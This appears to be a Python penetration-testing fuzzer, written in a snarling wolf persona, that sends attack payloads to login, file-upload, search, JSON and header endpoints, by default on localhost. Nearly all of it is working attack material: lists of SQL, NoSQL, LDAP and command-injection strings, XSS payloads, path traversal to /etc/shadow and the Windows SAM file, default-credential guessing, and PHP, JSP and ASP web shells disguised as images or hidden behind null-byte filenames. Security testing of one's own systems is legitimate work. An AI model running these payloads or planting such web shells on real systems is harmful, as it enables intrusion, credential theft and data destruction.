"""
🐺 ENDPOINT-SPECIFIC FUZZING

*snarls with predatory glee* Targeted fuzzing for specific endpoint types
with specialized attack vectors!
"""

import asyncio
import httpx
import random
import time
from typing import List, Dict, Any, Optional
from dataclasses import dataclass
from rich.console import Console
from rich.panel import Panel

from .payload_generator import PayloadGenerator
from .comprehensive_fuzzer import FuzzResult, ComprehensiveFuzzer

console = Console()

class EndpointFuzzer:
    """
    *circles with menacing intent* Specialized fuzzing for specific endpoint types
    
    *bares fangs with savage satisfaction* Each endpoint type gets its own
    customized attack vectors!
    """
    
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url.rstrip('/')
        self.payload_generator = PayloadGenerator()
        self.session = httpx.AsyncClient(timeout=30.0)
        
    async def __aenter__(self):
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.session.aclose()
    
    async def fuzz_login_endpoint(self, endpoint: str = "/api/auth/login") -> List[FuzzResult]:
        """Fuzz login endpoint with authentication bypass attempts"""
        console.print(Panel.fit(
            f"[bold red]🐺 FUZZING LOGIN ENDPOINT: {endpoint}[/bold red]\n"
            "*snarls with predatory glee* Time to break your authentication!",
            border_style="red"
        ))
        
        results = []
        url = f"{self.base_url}{endpoint}"
        
        # SQL injection attempts
        sql_payloads = [
            {"username": "' OR 1=1 --", "password": ""},
            {"username": "admin'--", "password": ""},
            {"username": "admin' #", "password": ""},
            {"username": "' or '1'='1", "password": "' or '1'='1"},
            {"username": "admin", "password": "' OR 1=1 --"},
            {"username": "admin", "password": "admin'--"},
            {"username": "' UNION SELECT NULL,NULL,NULL--", "password": ""},
            {"username": "admin' OR 'x'='x", "password": "admin' OR 'x'='x"},
            {"username": "' OR 1=1 LIMIT 1--", "password": ""},
            {"username": "admin'; DROP TABLE users; --", "password": ""},
        ]
        
        # XSS attempts
        xss_payloads = [
            {"username": "<script>alert('XSS')</script>", "password": "test"},
            {"username": "admin", "password": "<img src=x onerror=alert('XSS')>"},
            {"username": "<svg onload=alert('XSS')>", "password": "test"},
            {"username": "admin", "password": "javascript:alert('XSS')"},
            {"username": "<iframe src=javascript:alert('XSS')>", "password": "test"},
        ]
        
        # Command injection attempts
        cmd_payloads = [
            {"username": "; ls -la", "password": "test"},
            {"username": "admin", "password": "| whoami"},
            {"username": "` id `", "password": "test"},
            {"username": "admin", "password": "$(whoami)"},
            {"username": "; cat /etc/passwd", "password": "test"},
            {"username": "admin", "password": "| cat /etc/passwd"},
        ]
        
        # Special character attempts
        special_payloads = [
            {"username": "", "password": ""},
            {"username": " ", "password": " "},
            {"username": "null", "password": "null"},
            {"username": "undefined", "password": "undefined"},
            {"username": "\x00", "password": "\x00"},
            {"username": "a" * 1000, "password": "a" * 1000},
            {"username": "\n", "password": "\n"},
            {"username": "\r\n", "password": "\r\n"},
            {"username": "\\", "password": "\\"},
            {"username": "\"", "password": "\""},
        ]
        
        # Authentication bypass attempts
        bypass_payloads = [
            {"username": "admin", "password": "admin"},
            {"username": "root", "password": "root"},
            {"username": "administrator", "password": "administrator"},
            {"username": "test", "password": "test"},
            {"username": "user", "password": "user"},
            {"username": "guest", "password": "guest"},
            {"username": "demo", "password": "demo"},
            {"username": "admin", "password": ""},
            {"username": "", "password": "admin"},
            {"username": "admin", "password": "password"},
        ]
        
        all_payloads = sql_payloads + xss_payloads + cmd_payloads + special_payloads + bypass_payloads
        
        for payload in all_payloads:
            result = await self._send_login_request(url, payload)
            results.append(result)
        
        return results
    
    async def _send_login_request(self, url: str, payload: Dict[str, str]) -> FuzzResult:
        """Send a login request with fuzzed payload"""
        start_time = time.time()
        
        try:
            response = await self.session.post(url, json=payload)
            end_time = time.time()
            
            # Analyze response for authentication bypass
            vulnerability_detected = False
            vulnerability_type = None
            
            if response.status_code == 200:
                response_data = response.json()
                if "access_token" in response_data or "token" in response_data:
                    vulnerability_detected = True
                    vulnerability_type = "Authentication Bypass"
            
            return FuzzResult(
                url=url,
                method="POST",
                payload=str(payload),
                status_code=response.status_code,
                response_time=end_time - start_time,
                response_size=len(response.content),
                vulnerability_detected=vulnerability_detected,
                vulnerability_type=vulnerability_type,
                # Capture full response details
                response_body=response.text,
                response_text=response.text,
                response_headers=dict(response.headers),
                request_headers=None
            )
            
        except Exception as e:
            end_time = time.time()
            return FuzzResult(
                url=url,
                method="POST",
                payload=str(payload),
                status_code=0,
                response_time=end_time - start_time,
                response_size=0,
                error=str(e),
                # Capture any available response data even on error
                response_body=None,
                response_text=None,
                response_headers=None,
                request_headers=None
            )
    
    async def fuzz_file_upload_endpoint(self, endpoint: str = "/api/files/upload") -> List[FuzzResult]:
        """Fuzz file upload endpoint with malicious files"""
        console.print(Panel.fit(
            f"[bold red]🐺 FUZZING FILE UPLOAD ENDPOINT: {endpoint}[/bold red]\n"
            "*bares fangs with savage satisfaction* Let's break your file security!",
            border_style="red"
        ))
        
        results = []
        url = f"{self.base_url}{endpoint}"
        
        # Malicious file types - Web shells
        web_shells = [
            ("shell.php", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
            ("shell.jsp", b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "application/x-jsp"),
            ("shell.asp", b"<% eval request(\"cmd\") %>", "application/x-asp"),
            ("shell.py", b"import os; os.system(input())", "application/x-python"),
            ("shell.sh", b"#!/bin/bash\n/bin/bash", "application/x-sh"),
            ("shell.bat", b"@echo off\ncmd.exe", "application/x-bat"),
            ("shell.exe", b"MZ\x90\x00", "application/x-executable"),
            ("shell.cgi", b"#!/bin/bash\necho 'Content-Type: text/html'\necho ''\necho '<html><body>'\necho '<pre>'\n/bin/bash\necho '</pre>'\necho '</body></html>'", "application/x-cgi"),
        ]
        
        # Fake image files with embedded code
        fake_images = [
            ("shell.jpg", b"\xFF\xD8\xFF\xE0\x00\x10JFIF<?php system($_GET['cmd']); ?>", "image/jpeg"),
            ("shell.png", b"\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>", "image/png"),
            ("shell.gif", b"GIF89a<?php system($_GET['cmd']); ?>", "image/gif"),
            ("shell.bmp", b"BM<?php system($_GET['cmd']); ?>", "image/bmp"),
        ]
        
        # Path traversal filenames
        path_traversal_files = [
            ("../../../etc/passwd", b"test content", "text/plain"),
            ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", b"test content", "text/plain"),
            ("/proc/self/cmdline", b"test content", "text/plain"),
            ("..\\..\\..\\windows\\system32\\config\\sam", b"test content", "text/plain"),
            ("../../../var/log/auth.log", b"test content", "text/plain"),
            ("..\\..\\..\\windows\\system32\\drivers\\etc\\services", b"test content", "text/plain"),
        ]
        
        # Oversized files
        oversized_files = [
            ("huge.txt", b"A" * (10 * 1024 * 1024), "text/plain"),  # 10MB file
            ("massive.bin", b"\x00" * (100 * 1024 * 1024), "application/octet-stream"),  # 100MB file
        ]
        
        # Files with dangerous extensions
        dangerous_extensions = [
            ("test.phtml", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
            ("test.php3", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
            ("test.php4", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
            ("test.php5", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
            ("test.pht", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
            ("test.phar", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
            ("test.jspx", b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "application/x-jsp"),
            ("test.jspf", b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "application/x-jsp"),
        ]
        
        # Files with null bytes (null byte injection)
        null_byte_files = [
            ("shell.php\x00.jpg", b"<?php system($_GET['cmd']); ?>", "image/jpeg"),
            ("shell.jsp\x00.png", b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "image/png"),
            ("shell.asp\x00.gif", b"<% eval request(\"cmd\") %>", "image/gif"),
        ]
        
        all_files = (web_shells + fake_images + path_traversal_files + 
                    oversized_files + dangerous_extensions + null_byte_files)
        
        for filename, content, content_type in all_files:
            result = await self._send_file_upload_request(url, filename, content, content_type)
            results.append(result)
        
        return results
    
    async def _send_file_upload_request(self, url: str, filename: str, content: bytes, content_type: str) -> FuzzResult:
        """Send a file upload request with malicious file"""
        start_time = time.time()
        
        try:
            files = {"file": (filename, content, content_type)}
            response = await self.session.post(url, files=files)
            end_time = time.time()
            
            # Analyze response for file upload vulnerability
            vulnerability_detected = False
            vulnerability_type = None
            
            if response.status_code == 200:
                response_text = response.text.lower()
                if "uploaded" in response_text or "success" in response_text:
                    vulnerability_detected = True
                    vulnerability_type = "File Upload Vulnerability"
            
            return FuzzResult(
                url=url,
                method="POST",
                payload=f"filename={filename}, content_type={content_type}",
                status_code=response.status_code,
                response_time=end_time - start_time,
                response_size=len(response.content),
                vulnerability_detected=vulnerability_detected,
                vulnerability_type=vulnerability_type
            )
            
        except Exception as e:
            end_time = time.time()
            return FuzzResult(
                url=url,
                method="POST",
                payload=f"filename={filename}, content_type={content_type}",
                status_code=0,
                response_time=end_time - start_time,
                response_size=0,
                error=str(e)
            )
    
    async def fuzz_search_endpoint(self, endpoint: str = "/api/search") -> List[FuzzResult]:
        """Fuzz search endpoint with injection attempts"""
        console.print(Panel.fit(
            f"[bold red]🐺 FUZZING SEARCH ENDPOINT: {endpoint}[/bold red]\n"
            "*snarls with predatory glee* Time to break your search security!",
            border_style="red"
        ))
        
        results = []
        url = f"{self.base_url}{endpoint}"
        
        # SQL injection payloads
        sql_payloads = [
            "' OR 1=1 --",
            "' UNION SELECT NULL,NULL,NULL--",
            "admin'--",
            "' or '1'='1",
            "' OR 1=1 LIMIT 1--",
            "admin' OR 'x'='x",
            "' UNION SELECT username,password FROM users--",
            "'; DROP TABLE users; --",
            "' OR 1=1 ORDER BY 1--",
            "' OR 1=1 GROUP BY 1--",
            "' OR 1=1 HAVING 1=1--",
            "' OR 1=1 UNION SELECT 1,2,3--",
            "' OR 1=1 AND 1=1--",
            "' OR 1=1 OR 1=1--",
            "' OR 1=1 /*",
            "' OR 1=1 #",
        ]
        
        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<math><mi//xlink:href=\"data:x,<script>alert('XSS')</script>\">",
        ]
        
        # Path traversal payloads
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/proc/self/cmdline",
            "../../../var/log/auth.log",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "../../../etc/shadow",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\services",
            "../../../etc/hosts",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\protocols",
            "../../../etc/group",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\networks",
            "../../../etc/sudoers",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts.allow",
            "../../../etc/crontab",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts.deny",
        ]
        
        # Command injection payloads
        cmd_payloads = [
            "; ls -la",
            "| whoami",
            "` id `",
            "$(whoami)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "` cat /etc/passwd `",
            "$(cat /etc/passwd)",
            "; uname -a",
            "| uname -a",
            "` uname -a `",
            "$(uname -a)",
            "; ps aux",
            "| ps aux",
            "` ps aux `",
            "$(ps aux)",
            "; netstat -an",
            "| netstat -an",
            "` netstat -an `",
            "$(netstat -an)",
        ]
        
        # NoSQL injection payloads
        nosql_payloads = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$where": "this.username == this.password"}',
            '{"$or": [{"username": "admin"}, {"password": "admin"}]}',
            '{"username": {"$ne": null}, "password": {"$ne": null}}',
            '{"$where": "function() { return true; }"}',
            '{"$where": "this.username.match(/.*/)"}',
        ]
        
        # LDAP injection payloads
        ldap_payloads = [
            "*",
            "*)(&",
            "*)(|",
            "*)(|(objectClass=*",
            "*)(|(objectClass=user",
            "*)(|(objectClass=person",
            "*)(|(objectClass=organizationalPerson",
            "*)(|(objectClass=inetOrgPerson",
            "*)(|(objectClass=group",
            "*)(|(objectClass=groupOfNames",
            "*)(|(objectClass=groupOfUniqueNames",
            "*)(|(objectClass=organizationalUnit",
            "*)(|(objectClass=domain",
            "*)(|(objectClass=country",
            "*)(|(objectClass=locality",
        ]
        
        # Special character payloads
        special_payloads = [
            "\x00",
            "\n",
            "\r\n",
            "\\",
            "\"",
            "'",
            "`",
            "|",
            "&",
            ";",
            "<",
            ">",
            "{",
            "}",
            "[",
            "]",
            "(",
            ")",
            "=",
            "+",
            "-",
            "*",
            "/",
            "%",
            "!",
            "@",
            "#",
            "$",
            "^",
            "~",
            "?",
            ":",
        ]
        
        # Long string payloads
        long_payloads = [
            "a" * 1000,
            "a" * 10000,
            "a" * 100000,
            "A" * 1000,
            "1" * 1000,
            "0" * 1000,
            " " * 1000,
            "\x00" * 1000,
        ]
        
        # Unicode payloads
        unicode_payloads = [
            "测试",
            "тест",
            "اختبار",
            "テスト",
            "테스트",
            "🧪",
            "🚀",
            "💀",
            "🔥",
            "⚡",
            "🎯",
            "🦊",
            "🐺",
            "🦦",
        ]
        
        all_payloads = (sql_payloads + xss_payloads + path_traversal_payloads + 
                       cmd_payloads + nosql_payloads + ldap_payloads + 
                       special_payloads + long_payloads + unicode_payloads)
        
        for payload in all_payloads:
            result = await self._send_search_request(url, payload)
            results.append(result)
        
        return results
    
    async def _send_search_request(self, url: str, payload: str) -> FuzzResult:
        """Send a search request with fuzzed payload"""
        start_time = time.time()
        
        try:
            # Try as query parameter
            params = {"q": payload, "search": payload, "query": payload}
            response = await self.session.get(url, params=params)
            end_time = time.time()
            
            # Analyze response for injection vulnerability
            vulnerability_detected, vulnerability_type = self._analyze_search_response(response, payload)
            
            return FuzzResult(
                url=url,
                method="GET",
                payload=payload,
                status_code=response.status_code,
                response_time=end_time - start_time,
                response_size=len(response.content),
                vulnerability_detected=vulnerability_detected,
                vulnerability_type=vulnerability_type
            )
            
        except Exception as e:
            end_time = time.time()
            return FuzzResult(
                url=url,
                method="GET",
                payload=payload,
                status_code=0,
                response_time=end_time - start_time,
                response_size=0,
                error=str(e)
            )
    
    def _analyze_search_response(self, response: httpx.Response, payload: str) -> tuple[bool, Optional[str]]:
        """Analyze search response for injection vulnerabilities"""
        response_text = response.text.lower()
        payload_lower = payload.lower()
        
        # Check for SQL injection
        if any(indicator in response_text for indicator in ["sql syntax", "mysql", "database error"]):
            return True, "SQL Injection"
        
        # Check for XSS
        if payload_lower in response_text and any(tag in payload_lower for tag in ["<script>", "<img", "<svg"]):
            return True, "XSS"
        
        # Check for path traversal
        if any(indicator in response_text for indicator in ["root:", "etc:", "windows", "system32"]):
            return True, "Path Traversal"
        
        # Check for command injection
        if any(indicator in response_text for indicator in ["command not found", "permission denied", "whoami:"]):
            return True, "Command Injection"
        
        return False, None
    
    async def fuzz_api_endpoint_comprehensive(self, endpoint: str, method: str = "GET") -> List[FuzzResult]:
        """Comprehensive fuzzing of a specific API endpoint"""
        console.print(Panel.fit(
            f"[bold red]🐺 COMPREHENSIVE FUZZING: {method} {endpoint}[/bold red]\n"
            "*packs hunting formation* Coordinating multiple attack vectors!",
            border_style="red"
        ))
        
        # Use the comprehensive fuzzer for this endpoint
        async with ComprehensiveFuzzer(self.base_url) as fuzzer:
            return await fuzzer.fuzz_endpoint(endpoint, method, payload_count=100)
    
    async def fuzz_json_endpoint(self, endpoint: str, method: str = "POST") -> List[FuzzResult]:
        """Fuzz JSON API endpoints with malformed JSON payloads"""
        console.print(Panel.fit(
            f"[bold red]🐺 FUZZING JSON ENDPOINT: {method} {endpoint}[/bold red]\n"
            "*snarls with predatory glee* Time to break your JSON parsing!",
            border_style="red"
        ))
        
        results = []
        url = f"{self.base_url}{endpoint}"
        
        # Malformed JSON payloads
        json_payloads = [
            '{"malformed": json}',
            '{"unclosed": "string}',
            '{"trailing": "comma",}',
            '{"duplicate": "key", "duplicate": "value"}',
            '{"null": null, "undefined": undefined}',
            '{"infinity": Infinity, "nan": NaN}',
            '{"deep": {"nested": {"object": {"with": {"many": {"levels": "deep"}}}}}}',
            '{"array": [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]}',
            '{"unicode": "测试🚀💀🔥"}',
            '{"xss": "<script>alert(\'XSS\')</script>"}',
            '{"sql": "\' OR 1=1 --"}',
            '{"cmd": "; ls -la"}',
            '{"path": "../../../etc/passwd"}',
            '{"size": "' + "A" * 10000 + '"}',
            '{"null_bytes": "\x00\x01\x02\x03"}',
        ]
        
        for payload in json_payloads:
            result = await self._send_json_request(url, method, payload)
            results.append(result)
        
        return results
    
    async def _send_json_request(self, url: str, method: str, payload: str) -> FuzzResult:
        """Send a JSON request with malformed payload"""
        start_time = time.time()
        
        try:
            headers = {"Content-Type": "application/json"}
            response = await self.session.request(method, url, data=payload, headers=headers)
            end_time = time.time()
            
            # Analyze response for JSON parsing vulnerabilities
            vulnerability_detected, vulnerability_type = self._analyze_json_response(response, payload)
            
            return FuzzResult(
                url=url,
                method=method,
                payload=payload,
                status_code=response.status_code,
                response_time=end_time - start_time,
                response_size=len(response.content),
                vulnerability_detected=vulnerability_detected,
                vulnerability_type=vulnerability_type,
                response_body=response.text,
                response_text=response.text,
                response_headers=dict(response.headers),
                request_headers=headers
            )
            
        except Exception as e:
            end_time = time.time()
            return FuzzResult(
                url=url,
                method=method,
                payload=payload,
                status_code=0,
                response_time=end_time - start_time,
                response_size=0,
                error=str(e),
                response_body=None,
                response_text=None,
                response_headers=None,
                request_headers={"Content-Type": "application/json"}
            )
    
    def _analyze_json_response(self, response: httpx.Response, payload: str) -> tuple[bool, Optional[str]]:
        """Analyze JSON response for parsing vulnerabilities"""
        response_text = response.text.lower()
        
        # Check for JSON parsing errors that might indicate vulnerabilities
        if response.status_code == 400:
            if any(indicator in response_text for indicator in ["json", "parse", "syntax", "malformed"]):
                return True, "JSON Parsing Vulnerability"
        
        # Check for information disclosure in error messages
        if any(indicator in response_text for indicator in ["stack trace", "exception", "error in", "warning:"]):
            return True, "Information Disclosure"
        
        return False, None
    
    async def fuzz_headers_endpoint(self, endpoint: str, method: str = "GET") -> List[FuzzResult]:
        """Fuzz endpoints with malicious headers"""
        console.print(Panel.fit(
            f"[bold red]🐺 FUZZING HEADERS: {method} {endpoint}[/bold red]\n"
            "*bares fangs with savage satisfaction* Let's break your header parsing!",
            border_style="red"
        ))
        
        results = []
        url = f"{self.base_url}{endpoint}"
        
        # Malicious header payloads
        header_payloads = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Forwarded-Host": "evil.com"},
            {"X-Forwarded-Proto": "https"},
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Forwarded-Server": "evil.com"},
            {"X-Host": "evil.com"},
            {"X-Forwarded-For": "127.0.0.1, 192.168.1.1, 10.0.0.1"},
            {"X-Forwarded-For": "127.0.0.1\r\nX-Injected-Header: evil"},
            {"User-Agent": "<script>alert('XSS')</script>"},
            {"Referer": "javascript:alert('XSS')"},
            {"Origin": "https://evil.com"},
            {"X-Requested-With": "XMLHttpRequest"},
            {"X-Custom-Header": "' OR 1=1 --"},
            {"X-API-Key": "admin"},
            {"Authorization": "Bearer invalid_token"},
            {"Cookie": "sessionid=admin; admin=true"},
            {"X-Forwarded-For": "127.0.0.1\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"},
        ]
        
        for headers in header_payloads:
            result = await self._send_header_request(url, method, headers)
            results.append(result)
        
        return results
    
    async def _send_header_request(self, url: str, method: str, headers: Dict[str, str]) -> FuzzResult:
        """Send a request with malicious headers"""
        start_time = time.time()
        
        try:
            response = await self.session.request(method, url, headers=headers)
            end_time = time.time()
            
            # Analyze response for header-based vulnerabilities
            vulnerability_detected, vulnerability_type = self._analyze_header_response(response, headers)
            
            return FuzzResult(
                url=url,
                method=method,
                payload=str(headers),
                status_code=response.status_code,
                response_time=end_time - start_time,
                response_size=len(response.content),
                vulnerability_detected=vulnerability_detected,
                vulnerability_type=vulnerability_type,
                response_body=response.text,
                response_text=response.text,
                response_headers=dict(response.headers),
                request_headers=headers
            )
            
        except Exception as e:
            end_time = time.time()
            return FuzzResult(
                url=url,
                method=method,
                payload=str(headers),
                status_code=0,
                response_time=end_time - start_time,
                response_size=0,
                error=str(e),
                response_body=None,
                response_text=None,
                response_headers=None,
                request_headers=headers
            )
    
    def _analyze_header_response(self, response: httpx.Response, headers: Dict[str, str]) -> tuple[bool, Optional[str]]:
        """Analyze response for header-based vulnerabilities"""
        response_text = response.text.lower()
        
        # Check for successful bypass attempts
        if response.status_code == 200:
            # Check if we got admin access
            if any(indicator in response_text for indicator in ["admin", "dashboard", "management", "control"]):
                return True, "Header Injection Bypass"
        
        # Check for information disclosure
        if any(indicator in response_text for indicator in ["stack trace", "exception", "error in", "warning:"]):
            return True, "Information Disclosure"
        
        return False, None

async def main():
    """Main execution function for testing"""
    async with EndpointFuzzer() as fuzzer:
        # Test different endpoint types
        await fuzzer.fuzz_login_endpoint()
        await fuzzer.fuzz_file_upload_endpoint()
        await fuzzer.fuzz_search_endpoint()

if __name__ == "__main__":
    asyncio.run(main())
